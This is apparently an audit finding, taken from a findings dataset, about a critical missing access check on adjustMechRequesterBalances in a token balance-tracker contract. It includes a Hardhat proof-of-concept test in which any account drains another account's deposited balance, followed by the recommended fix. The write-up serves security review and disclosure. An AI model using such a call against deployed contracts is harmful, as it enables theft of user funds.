# [C] Anyone can call adjustMechRequesterBalances

## Summary
Severity: Critical
Contest weight: 0.6125
Dataset id: 6379
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Unlike checkAndRecordDeliveryRates and finalizeDeliveryRates, adjustMechRequesterBalances is missing the check to make sure only the mechMarketplace can call this endpoint. Anyone can call this endpoint with arbitrary parameters and can manipulate all the mapRequesterBalances and mapMechBalances and thus drain all funds from this contract.

## Proof of Concept
add the following test case to test/MechFixedPriceToken.js and run:
```bash
npm exec hardhat test -- --grep "Balance Tracker"
context("Balance Tracker", async function () {
it("Anyone can call adjustMechRequesterBalances", async function () {
const bob = signers[1];
const bt = await ethers.getContractAt("BalanceTrackerFixedPriceToken",
balanceTrackerFixedPriceToken.address);
await token.approve(balanceTrackerFixedPriceToken.address, initMint);
await bt.deposit(initMint);
await bt.connect(bob).adjustMechRequesterBalances(
bob.address,
deployer.address,
[initMint],
"0x"
);
const bobBalance = await bt.mapMechBalances(bob.address);
const deployerBalance = await bt.mapRequesterBalances(deployer.address);
expect(bobBalance).to.be.equal(initMint);
expect(deployerBalance).to.be.equal(0);
});
});
```

## Recommendation
Make sure the following check is included in this function:
```solidity
// Check for marketplace access
if (msg.sender != mechMarketplace) {
revert MarketplaceOnly(msg.sender, mechMarketplace);
}
```
